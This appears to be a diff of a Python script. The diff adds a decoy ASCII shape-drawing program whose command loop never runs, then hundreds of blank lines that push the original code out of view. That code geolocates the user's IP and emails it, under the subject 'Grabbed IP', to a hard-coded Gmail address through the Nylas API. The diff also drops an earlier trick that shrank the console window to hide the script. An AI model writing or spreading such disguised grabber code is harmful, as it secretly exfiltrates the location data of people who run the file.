@@ -1,12 +1,462 @@
+import math
+import time
+import os
+import threading
+
+grid = []
+
+def createGrid(x_, y_):
+    for x in range(x_):
+        grid.append([])
+        for y in range(y_):
+            grid[x].append(".")
+
+def circle(xOff, yOff, rad):
+    if len(grid) == 50:
+        for x in range(50):
+            grid[24][x] = "|"
+            grid[23][x] = "|"
+
+        grid[24][24] = "+"
+        grid[23][23] = "+"
+        grid[23][24] = "+"
+        grid[24][23] = "+"
+    try:
+        for z in range(89):
+            x = int(rad * math.cos((z + 1) * math.pi / 180))
+            y = int(rad * math.sin((z + 1) * math.pi / 180))
+            grid[x + 12 + xOff][y + 12 + yOff] = "#"
+
+            x_ = int(rad * math.cos((z + 1) * -1 * math.pi / 180))
+            y_ = int(rad * math.sin((z + 1) * -1 * math.pi / 180))
+            grid[x_ + 12 + xOff][y_ + 11 + yOff] = "#"
+
+            x__ = int(rad * math.cos((z + 1) * 1 * math.pi / 180))
+            y__ = int(rad * math.sin((z + 1) * -1 * math.pi / 180))
+            grid[y__ + 11 + xOff][x__ + 12 + yOff] = "#"
+
+            x___ = int(rad * math.cos((z + 1) * math.pi / 180))
+            y___ = int(rad * math.sin((z + 1) * math.pi / 180))
+            grid[x___ * -1 - 39 + xOff][y___ * -1 - 39 + yOff] = "#"
+    except:
+        print("Error creating shape. Error: value too high.")
+        return True
+    finally:
+        return False
+
+def render():
+    print("  ", end=" ")
+
+    for x in range(len(grid)):
+        if len(str(x)) == 1:
+            print(x, end=" ")
+        else:
+            print(str(x)[0], end=" ")
+
+    print()
+    print(" ", end="  ")
+    for x in range(len(grid[0])):
+        if len(str(x)) == 1:
+            print("!", end=" ")
+        else:
+            print(str(x)[1], end=" ")
+    print()
+    for x in range(len(grid)):
+        if len(str(x)) == 1:
+            print(x, end="  ")
+        else:
+            print(x, end=" ")
+        for y in range(len(grid[x])):
+            print(grid[x][y], end=" ")
+        print()
+
+def sine():
+    temp = -2
+    num = 0
+
+    while True:
+        temp += 0.2
+        temp2 = num
+        num = int(math.sin(temp) * 10) + 14
+        for x in range(num):
+            print(" ", end="")
+        if temp2 > num:
+            print("/")
+        if temp2 < num:
+            print("\ ")
+        if temp2 == num:
+            print("|")
+        time.sleep(0.05)
+
+def rect(ax, ay, bx, cy):
+    dy = cy
+    dx = bx
+    by = ay
+    cx = ax
+    top = range(ax, bx + 1)
+    left = range(ay, cy + 1)
+    bottom = range(cx, dx + 1)
+    right = range(by, dy + 1)
+
+    for x in top:
+        grid[x][ay] = "#"
+    for x in bottom:
+        grid[x][cy] = "#"
+    for x in left:
+        grid[ax][x] = "#"
+    for x in right:
+        grid[bx][x] = "#"
+
+def line(x1, y1, x2, y2):
+    grid[x1][y1] = "#"
+    grid[x2][y2] = "#"
+    for x in range(int(math.sqrt(math.fabs((x2 - x1) + (y2 - y1))))):
+        grid[int((x1 + x2) / 2) - x][int((y1 + y2) / 2) - x] = "#"
+    for x in range(int(math.sqrt(math.fabs((x2 - x1) + (y2 - y1))))):
+        grid[int((x1 + x2) / 2) + x][int((y1 + y2) / 2) + x] = "#"
+
+threading.Thread(target=sine).start()
+
+while False:
+    error = False
+    ui = input(">>>")
+    if not grid and not ui == "grid":
+        print("Error: to run commands, first create a grid. Type 'grid'.")
+    else:
+        if ui == "grid":
+            createGrid(int(input("grid x size (default is 50)")), int(input("grid y size (default is 50)")))
+        elif ui == "circle":
+            error = circle(int(input("x offset (default is 12)")), int(input("y offset (default is 12)")), int(input("radius (default is 12)")))
+        elif ui == "line":
+            line(int(input("x1")), int(input("y1")), int(input("x2")), int(input("y2")))
+        elif ui == "help":
+            print("grid: takes 2 values (don't use when grid exists. To resize grid use clear grid first.)")
+            print("clear grid: takes 0 values")
+            print("render: takes 0 values")
+            print("circle: takes 3 values")
+            print("rect or rectangle: takes 4 values")
+            print("line: takes 4 values")
+            print("quad: takes 8 values")
+            error = True
+        elif ui == "render":
+            render()
+            error = True
+        elif ui == "rect" or ui == "rectangle":
+            rect(int(input("point a x")), int(input("point a y")), int(input("point b x")), int(input("point c y")))
+        elif ui == "clear grid":
+            if input("Warning; this will completely remove the grid, you will have to make another one. Type N to go back, else type any thing to continue.").capitalize() == "N":
+                grid = grid
+            else:
+                grid = []
+                error = True
+        else:
+            print("Unknown command. Type 'help' for a list of commands.")
+        if not error:
+            os.system("cls")
+            render()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 import os
 import sys
 import time
-import threading
-def winset():
-    while True:
-        os.system("mode con: COLS=16 LINES=1")
-thread = threading.Thread(target=winset)
-thread.start()
 from nylas import APIClient
 import geocoder
 from requests import get
@@ -19,4 +469,3 @@ draft.subject = "Grabbed IP"
 draft.body = body
 draft.to = [{'name': '', 'email': 'python.reciever.email@gmail.com'}]
 draft.send()
-exit()
